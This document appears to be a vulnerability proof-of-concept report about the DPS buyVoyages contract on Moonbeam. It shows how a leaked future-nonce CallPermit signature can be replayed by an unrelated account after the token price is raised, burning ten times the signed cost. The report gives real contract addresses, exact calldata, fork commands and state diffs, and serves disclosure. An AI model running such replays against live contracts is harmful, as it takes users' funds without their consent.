# DPS `buyVoyages` CallPermit economic replay PoC

Date: 2026-05-12

## Verdict

**Replay succeeded on Moonbeam-native Chopsticks using real Moonbeam runtime and real DPS contracts.**

The PoC proves the economic-loss class:

```text
user signs buyVoyages at low current TMAP price
-> future-nonce CallPermit dispatch fails and publishes v/r/s
-> nonce later becomes current
-> gameSettings.tmapPerVoyage is increased
-> unrelated account replays exact same CallPermit calldata
-> buyVoyages succeeds, burns higher current TMAP amount, and mints a voyage
```

No mock Solidity contracts were used.

## Real Contracts

| Role | Address |
|---|---|
| CallPermit precompile | `0x000000000000000000000000000000000000080a` |
| DPS Cartographer V1 | `0xD1A9bA3e61Ac676f58B29EA0a09Cf5D7f4f35138` |
| DPS GameSettings | `0xC7c536d85D40360E1b93fE06Ab06e5427AE4cED4` |
| TMAP token | `0x0e67601818237834fF8A280312a6F4F4934e6283` |
| DPS Voyage V2 | `0x72A33394f0652e2Bf15d7901f3Cd46863d968424` |

Source evidence:

- Moonbeam docs use this exact `Cartographer V1` target/action for gasless CallPermit `buyVoyages`.
- `buyVoyages(uint16,uint256,address)` reads current price from `gameSettings.tmapPerVoyage(_voyageType)`.
- `GameSettings.setTmapPerVoyage(type, amount)` can mutate that price.

Relevant source:

```solidity
uint256 amountOfTmap = gameSettings.tmapPerVoyage(_voyageType);
if (tmap.balanceOf(msg.sender) < amountOfTmap * _amount) revert NotEnoughTokens();
...
tmap.burn(msg.sender, amountOfTmap);
_voyage.mint(msg.sender, voyageId, voyageConfig);
```

Mutable price setter:

```solidity
function setTmapPerVoyage(uint256 _type, uint256 _amount) external onlyOwner {
    tmapPerVoyage[_type] = _amount;
}
```

## Signed Action

Function:

```text
buyVoyages(uint16 _voyageType,uint256 _amount,address _voyage)
```

Args:

```json
{
  "voyageType": 0,
  "amount": "1",
  "voyage": "0x72A33394f0652e2Bf15d7901f3Cd46863d968424"
}
```

Inner calldata:

```text
0xdb76d5b30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000072a33394f0652e2bf15d7901f3cd46863d968424
```

The signed calldata fixes:

- voyage type;
- amount;
- voyage contract.

It does **not** fix:

- `maxPrice`;
- `expectedCost`;
- expected `tmapPerVoyage`;
- relayer / dispatcher.

CallPermit dispatch calldata hash:

```text
0xd8e6aff2fbf90eb5cd0b53128c66e329dbef7fd5a56b3acd0bea740b49845367
```

Signed future nonce:

```text
1
```

Deadline:

```text
1778582700
```

## Accounts

| Role | Address |
|---|---|
| Signed user | `0xE2823B3C9Eef89520617589c2056Fde633B61C53` |
| Original publish dispatcher | `0x0d0E74c0f8c790C89945B852fa8A5708516641D4` |
| Replay dispatcher | `0x387d113949a1a2D5Df01B869aa992e94Bd062035` |
| Replay unrelated? | `true` |

## Execution Proof

Script:

```text
research/replay_dps_buyvoyages_economic_chopsticks.js
```

Full result:

```text
research/replay_dps_buyvoyages_economic_result.json
```

Chopsticks command:

```powershell
.\node_modules\.bin\chopsticks.cmd --config=moonbeam --port 8011 --build-block-mode Instant
node research\replay_dps_buyvoyages_economic_chopsticks.js > research\replay_dps_buyvoyages_economic_result.json
```

Result:

```text
ECONOMIC_REPLAY_SUCCEEDED
```

### 1. Failed public/future-nonce publish

Tx hash on fork:

```text
0x545aea07aa204ca7291309465e33d6a6ab78d4fa5fb00bf4587d9a3d9e9b72c0
```

Event:

```text
ethereum.Executed
exitReason = Revert: Reverted
extraData = Invalid permit
```

Nonce stayed unconsumed:

```text
0 -> 0
```

This publishes the exact future-nonce CallPermit calldata and signature.

### 2. Nonce becomes current

A separate valid nonce-0 CallPermit was executed to advance the user nonce.

Tx hash on fork:

```text
0x0335a1e5a5eae894429633cf2871a009f9ca9447d437403a49a3bab3f553651c
```

Event:

```text
ethereum.Executed
exitReason = Succeed: Returned
```

Nonce:

```text
0 -> 1
```

The previously published future-nonce signature is now current/replayable.

### 3. Price changes after signing

At signing:

```text
tmapPerVoyage(0) = 1000000000000000000
```

Before replay:

```text
tmapPerVoyage(0) = 10000000000000000000
```

The real `GameSettings.setTmapPerVoyage(0, 10e18)` setter was used on the fork.

### 4. Exact same calldata replay by unrelated dispatcher

Replay tx hash on fork:

```text
0xb4f2e0f9c43d0e72a4f175126b0136d8a59e15d796114418e02e3afe3cbe0f29
```

Exact calldata reused:

```text
true
```

Calldata hash:

```text
0xd8e6aff2fbf90eb5cd0b53128c66e329dbef7fd5a56b3acd0bea740b49845367
```

Event:

```text
ethereum.Executed
exitReason = Succeed: Returned
```

CallPermit nonce:

```text
1 -> 2
```

## State Diff

### TMAP burned

```text
Before replay TMAP balance: 20000000000000000000
After replay TMAP balance:  10000000000000000000
Burned on replay:           10000000000000000000
```

Expected burn at signing price:

```text
1000000000000000000
```

Extra burn vs signing-time price:

```text
9000000000000000000
```

### Voyage minted

```text
Voyage balance: 0 -> 1
maxMintedId:    714883 -> 714884
new owner:      0xE2823B3C9Eef89520617589c2056Fde633B61C53
```

## Impact Statement

This is not relayer griefing. The replay dispatcher is unrelated and does not need a fresh signature from the user.

The user signed an action while the current `tmapPerVoyage` price was `1 TMAP`, but the signed calldata had no `maxPrice`, `expectedCost`, or `expectedTmapPerVoyage`. After the signature was publicly exposed in failed CallPermit calldata and the nonce became current, an unrelated account replayed the exact same calldata after the real DPS price source was increased to `10 TMAP`. The real `buyVoyages` function then burned `10 TMAP` and minted a voyage.

This proves a High-impact class for state-dependent economic actions integrated with CallPermit:

- public failed/future-nonce dispatch can leak reusable `v/r/s`;
- dispatcher is not signed;
- target reads mutable economic state at execution;
- same signed action can execute later under worse economic conditions;
- nonce is consumed only on replay success.

